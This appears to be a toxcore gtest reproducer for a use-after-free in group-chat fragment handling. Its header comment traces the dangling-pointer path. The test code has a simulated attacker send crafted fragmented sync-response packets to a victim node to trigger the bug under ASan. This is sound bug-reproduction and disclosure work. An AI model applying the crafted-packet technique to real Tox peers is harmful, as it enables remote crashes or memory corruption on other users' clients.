/* SPDX-License-Identifier: GPL-3.0-or-later
 *
 * Reproducer for a use-after-free in group_chats.c : handle_gc_packet_fragment().
 *
 * get_gc_connection(chat, n) returns &chat->group[n].gconn -- an interior pointer
 * into the reallocatable chat->group[] array (grown by peer_add() ->
 * mem_vrealloc, group_chats.c). handle_gc_packet_fragment() holds that `gconn`
 * across gcc_handle_packet_fragment() and then dereferences it:
 *
 *   handle_gc_packet_fragment(gconn)                      [group_chats.c]
 *     -> gcc_handle_packet_fragment(gconn)                [group_connection.c]
 *        (final, empty fragment) reassembles the sequence and calls
 *        -> handle_gc_lossless_helper(..., payload[0], ...)
 *             -> handle_gc_sync_response
 *               -> unpack_gc_sync_announce
 *                 -> peer_add -> mem_vrealloc(chat->group)   chat->group MOVED
 *        gcc_handle_packet_fragment re-fetches its OWN local gconn (it knows the
 *        peer table can move) but returns only an int, so the CALLER's `gconn`
 *        is left dangling.
 *   back in handle_gc_packet_fragment (frag_ret == 0):
 *     gc_send_message_ack(chat, gconn, ...)                 -> use-after-free read
 *     gconn->last_received_packet_time = ...                -> use-after-free write
 *
 * The re-fetch idiom is present one frame too deep: gcc_handle_packet_fragment
 * re-fetches internally and handle_gc_lossless_packet re-fetches after its own
 * handle_gc_lossless_helper call, but handle_gc_packet_fragment in between does
 * not.
 *
 * To trigger peer_add the reassembled payload must be a *valid* GP_SYNC_RESPONSE
 * carrying an announce for a brand-new peer. A normal peer never sends that as a
 * fragment sequence, and random fuzzing essentially never produces a byte string
 * that reassembles into a valid announce, which is why this is unreachable by the
 * one-tox e2e fuzzer and by the random GC-handler fuzzer. Built with ASan it
 * aborts with heap-use-after-free in handle_gc_packet_fragment.
 */
#include <gtest/gtest.h>

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>

#include "../testing/support/public/simulation.hh"
#include "../testing/support/public/tox_network.hh"

#include "tox.h"
#include "tox_struct.h"

#include "Messenger.h"
#include "group_announce.h"
#include "group_chats.h"
#include "group_common.h"
#include "group_connection.h"
#include "net.h"

namespace {

using tox::test::connect_friends;
using tox::test::Simulation;

struct JoinCtx {
    uint32_t group = UINT32_MAX;
};

void on_group_invite(Tox *tox, Tox_Friend_Number friend_number, const uint8_t *invite_data,
    size_t invite_length, const uint8_t *group_name, size_t group_name_length, void *user_data)
{
    (void)group_name;
    (void)group_name_length;
    JoinCtx *j = static_cast<JoinCtx *>(user_data);
    if (j->group != UINT32_MAX) {
        return;
    }
    j->group = tox_group_invite_accept(tox, friend_number, invite_data, invite_length,
        reinterpret_cast<const uint8_t *>("attacker"), 8, nullptr, 0, nullptr);
}

TEST(GcFragment, UseAfterFreeOnPeerAddDuringReassembly)
{
    Simulation sim{7001};
    sim.net().set_latency(5);

    auto vnode = sim.create_node();
    auto victim = vnode->create_tox();  // founder; RECEIVES the crafted fragments
    auto anode = sim.create_node();
    auto attacker = anode->create_tox();  // member; SENDS the crafted fragments
    ASSERT_NE(victim, nullptr);
    ASSERT_NE(attacker, nullptr);

    ASSERT_TRUE(connect_friends(sim, *vnode, victim.get(), *anode, attacker.get()));

    JoinCtx actx;
    tox_callback_group_invite(attacker.get(), on_group_invite);

    Tox_Err_Group_New err_new;
    const uint32_t vgroup = tox_group_new(victim.get(), TOX_GROUP_PRIVACY_STATE_PUBLIC,
        reinterpret_cast<const uint8_t *>("g"), 1, reinterpret_cast<const uint8_t *>("founder"), 7,
        &err_new);
    ASSERT_EQ(err_new, TOX_ERR_GROUP_NEW_OK);

    Tox_Err_Group_Invite_Friend err_inv;
    ASSERT_TRUE(tox_group_invite_friend(victim.get(), vgroup, 0, &err_inv));

    // Wait until both sides have a fully handshaked/confirmed connection to each
    // other -- numpeers==2 alone only means the peer slot exists; the lossless
    // channel we attack isn't usable until the handshake completes.
    sim.run_until(
        [&]() {
            tox_iterate(victim.get(), nullptr);
            tox_iterate(attacker.get(), &actx);
            if (actx.group == UINT32_MAX) {
                return false;
            }
            GC_Chat *vchat = gc_get_group(victim->m->group_handler, vgroup);
            GC_Chat *achat = gc_get_group(attacker->m->group_handler, actx.group);
            if (vchat == nullptr || achat == nullptr || vchat->numpeers != 2 || achat->numpeers != 2) {
                return false;
            }
            GC_Connection *vg = get_gc_connection(vchat, 1);
            GC_Connection *ag = get_gc_connection(achat, 1);
            return vg != nullptr && ag != nullptr
                && vg->handshaked && vg->confirmed && ag->handshaked && ag->confirmed;
        },
        120000);

    GC_Chat *achat = gc_get_group(attacker->m->group_handler, actx.group);
    ASSERT_NE(achat, nullptr);
    ASSERT_EQ(achat->numpeers, 2u);

    // The attacker's connection to the victim (peer 0 is self).
    GC_Connection *victim_gconn = get_gc_connection(achat, 1);
    ASSERT_NE(victim_gconn, nullptr);
    fprintf(stderr, "group established; attacker sees %u peers\n", achat->numpeers);

    // Build a valid base announce for a brand-new (third) peer. ip_port_is_set is
    // enough for gca_is_valid_announce(), so peer_add() will accept it and grow
    // chat->group on the victim.
    GC_Announce ann;
    memset(&ann, 0, sizeof(ann));
    // A fixed, distinct public key for a brand-new peer the victim doesn't know.
    memset(ann.peer_public_key, 0x5A, ENC_PUBLIC_KEY_SIZE);
    ann.ip_port_is_set = true;
    ann.ip_port.ip.family = net_family_ipv4();
    ann.ip_port.ip.ip.v4.uint8[0] = 198;
    ann.ip_port.ip.ip.v4.uint8[1] = 51;
    ann.ip_port.ip.ip.v4.uint8[2] = 100;
    ann.ip_port.ip.ip.v4.uint8[3] = 7;
    ann.ip_port.port = net_htons(33445);
    ann.tcp_relays_count = 0;

    uint8_t packed[256];
    const int packed_len = gca_pack_announce(achat->log, packed, sizeof(packed), &ann);
    ASSERT_GT(packed_len, 0);

    // The sync-response payload is just a packed announce list. Pad past
    // MAX_GC_PACKET_CHUNK_SIZE (500) so the real send path fragments it; the
    // trailing bytes are ignored (gca_unpack_announces_list stops at max_count=1).
    std::vector<uint8_t> payload(700, 0);
    memcpy(payload.data(), packed, static_cast<size_t>(packed_len));

    ASSERT_GT(payload.size(), static_cast<size_t>(MAX_GC_PACKET_CHUNK_SIZE));

    fprintf(stderr, "sending fragmented GP_SYNC_RESPONSE (%zu bytes) to victim...\n", payload.size());
    ASSERT_TRUE(gcc_send_lossless_packet_fragments(achat, victim_gconn, payload.data(),
        static_cast<uint16_t>(payload.size()), GP_SYNC_RESPONSE));

    // Let the victim receive and reassemble the fragments. The final empty
    // fragment reassembles the sync response, peer_add() grows chat->group, and
    // handle_gc_packet_fragment then dereferences the stale gconn -> UAF.
    for (int i = 0; i < 400; ++i) {
        tox_iterate(attacker.get(), &actx);
        tox_iterate(victim.get(), nullptr);
        sim.advance_time(20);
    }

    GC_Chat *vchat = gc_get_group(victim->m->group_handler, vgroup);
    fprintf(stderr, "done (no ASan abort); victim numpeers=%u\n",
        vchat != nullptr ? vchat->numpeers : 0);
}

}  // namespace
